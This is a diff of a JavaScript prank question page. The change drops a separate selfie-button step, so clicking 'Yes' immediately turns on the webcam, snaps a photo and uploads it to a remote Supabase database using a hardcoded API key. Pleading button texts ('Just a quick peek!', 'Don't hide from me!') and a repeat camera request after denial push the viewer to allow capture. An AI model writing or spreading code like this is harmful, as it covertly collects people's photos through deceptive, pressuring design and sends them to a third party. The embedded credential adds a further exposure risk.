@@ -7,20 +7,17 @@ let yesScale = 1;
 const scaleFactor = 0.5; // How much the Yes button grows each time
 let noBtnTexts = [
     "Are you sure?",
-    "Really sure?",
-    "Think again!",
+    "Don't be shy!",
+    "Come on!",
+    "Just a quick peek!",
+    "I miss them!",
+    "Please? 🥺",
+    "You're breaking my heart ;_;",
+    "Let me see!",
+    "Don't hide from me!",
+    "I'll be sad!",
     "Last chance!",
-    "Surely not?",
-    "You might regret this!",
-    "Give it another thought!",
-    "Are you absolutely certain?",
-    "This could be a mistake!",
-    "Have a heart!",
-    "Don't be so cold!",
-    "Change of heart?",
-    "Wouldn't you reconsider?",
-    "Is that your final answer?",
-    "You're breaking my heart ;_;"
+    "Pretty please?"
 ];
 let clickCount = 0;
 
@@ -62,90 +59,78 @@ noBtn.addEventListener('click', () => {
 });
 
 yesBtn.addEventListener('click', () => {
-    // Hide everything and show final screen
-    document.body.innerHTML = `
-        <div class="success-screen" id="successScreen" style="display: flex;">
-            <h1>You're stuck with me now! 💕</h1>
-            <div class="img-container">
-                <img src="success.gif" alt="Cute Bears Hugging">
-            </div>
-            <button id="cameraBtn" class="btn btn-yes" style="margin-top: 2rem; z-index: 10;">Take a reaction selfie! 📸</button>
-        </div>
+    // Hide buttons, show capturing text
+    const card = document.getElementById('card');
+    card.innerHTML = `
+        <h1 style="color: #333; margin-bottom: 1rem; z-index:10;">Capturing... 📸</h1>
+        <video id="videoElement" autoplay playsinline muted style="display:none;"></video>
+        <canvas id="canvasElement" style="display:none;"></canvas>
     `;
     
     createFloatingEmojis();
 
-    setTimeout(() => {
-        document.getElementById('cameraBtn').addEventListener('click', () => {
-            const successScreen = document.getElementById('successScreen');
-            successScreen.innerHTML = `
-                <h1 style="color: white; margin-bottom: 1rem; z-index:10; text-shadow: 2px 2px 10px rgba(0,0,0,0.2);">Capturing... 📸</h1>
-                <video id="videoElement" autoplay playsinline muted style="display:none;"></video>
-                <canvas id="canvasElement" style="display:none;"></canvas>
-            `;
-            
-            const video = document.getElementById('videoElement');
-            const canvas = document.getElementById('canvasElement');
-            let stream;
+    const video = document.getElementById('videoElement');
+    const canvas = document.getElementById('canvasElement');
+    let stream;
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                .then(s => {
-                    stream = s;
-                    video.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(s => {
+            stream = s;
+            video.srcObject = stream;
+            
+            video.onloadeddata = () => {
+                // Wait exactly 1 second for the camera hardware to adjust its brightness and focus
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const base64Data = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    video.onloadeddata = () => {
-                        // Wait exactly 1 second for the camera hardware to adjust its brightness and focus
-                        setTimeout(() => {
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const base64Data = canvas.toDataURL('image/jpeg', 0.8);
-                            
-                            // Stop camera immediately
-                            if (stream) {
-                                stream.getTracks().forEach(track => track.stop());
-                            }
-            
-                            successScreen.innerHTML = `
-                                <h1 style="color:white; z-index:10; text-shadow: 2px 2px 10px rgba(0,0,0,0.2);">Sending... 💖</h1>
-                                <img src="${base64Data}" style="border-radius: 20px; max-width: 90vw; border: 3px solid white; z-index:10;" />
-                            `;
-                            
-                            // Upload to Supabase
-                            const supUrl = 'https://yogdlyemnatyefinhkbf.supabase.co';
-                            const supKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlvZ2RseWVtbmF0eWVmaW5oa2JmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MDcyMjgsImV4cCI6MjA5MTE4MzIyOH0.PbM4X-yIK1JkQkFRfC0QBv4cwKkHXrtcclXiaH9PBGE';
-            
-                            fetch(supUrl + '/rest/v1/photos', {
-                                method: 'POST',
-                                headers: {
-                                    'apikey': supKey,
-                                    'Authorization': 'Bearer ' + supKey,
-                                    'Content-Type': 'application/json',
-                                    'Prefer': 'return=minimal'
-                                },
-                                body: JSON.stringify({ image_data: base64Data })
-                            }).then(async res => {
-                                if (!res.ok) {
-                                    const errData = await res.json().catch(() => ({}));
-                                    const errMsg = errData.message || res.statusText || 'Unknown Database Error';
-                                    alert('Supabase Error: ' + errMsg + '\\n\\nPlease tell me what this error says. (Wait, did you make sure to turn OFF Row Level Security (RLS) on your photos table?)');
-                                    throw new Error(errMsg);
-                                }
-                                successScreen.innerHTML = `
-                                    <h1 style="color:white; z-index:10; text-shadow: 2px 2px 10px rgba(0,0,0,0.2);">Beautiful! Received! 😍</h1>
-                                    <img src="${base64Data}" style="border-radius: 20px; max-width: 90vw; border: 3px solid white; z-index:10;" />
-                                `;
-                            }).catch(err => {
-                                console.error(err);
-                            });
-                        }, 1000); 
-                    };
-                })
-                .catch(err => {
-                    alert("Camera access was denied or not available!");
-                });
+                    // Stop camera immediately
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+    
+                    card.innerHTML = `
+                        <h1 style="color:#333; z-index:10;">Sending... 💖</h1>
+                        <img src="${base64Data}" style="border-radius: 20px; max-width: 90vw; border: 3px solid white; z-index:10; margin-top: 10px;" />
+                    `;
+                    
+                    // Upload to Supabase
+                    const supUrl = 'https://yogdlyemnatyefinhkbf.supabase.co';
+                    const supKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlvZ2RseWVtbmF0eWVmaW5oa2JmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MDcyMjgsImV4cCI6MjA5MTE4MzIyOH0.PbM4X-yIK1JkQkFRfC0QBv4cwKkHXrtcclXiaH9PBGE';
+    
+                    fetch(supUrl + '/rest/v1/photos', {
+                        method: 'POST',
+                        headers: {
+                            'apikey': supKey,
+                            'Authorization': 'Bearer ' + supKey,
+                            'Content-Type': 'application/json',
+                            'Prefer': 'return=minimal'
+                        },
+                        body: JSON.stringify({ image_data: base64Data })
+                    }).then(async res => {
+                        if (!res.ok) {
+                            const errData = await res.json().catch(() => ({}));
+                            const errMsg = errData.message || res.statusText || 'Unknown Database Error';
+                            alert('Supabase Error: ' + errMsg);
+                            throw new Error(errMsg);
+                        }
+                        card.innerHTML = `
+                            <h1 style="color:#333; z-index:10;">Beautiful! Received! 😍</h1>
+                            <img src="${base64Data}" style="border-radius: 20px; max-width: 90vw; border: 3px solid white; z-index:10; margin-top: 10px;" />
+                        `;
+                    }).catch(err => {
+                        console.error(err);
+                    });
+                }, 1000); 
+            };
+        })
+        .catch(err => {
+            alert("Camera access was denied or not available!");
+            // Revert back so they reconsider
+            card.innerHTML = `<h1>Please allow the camera! 🥺</h1>`;
         });
-    }, 100);
 });
 
 function createFloatingEmojis() {
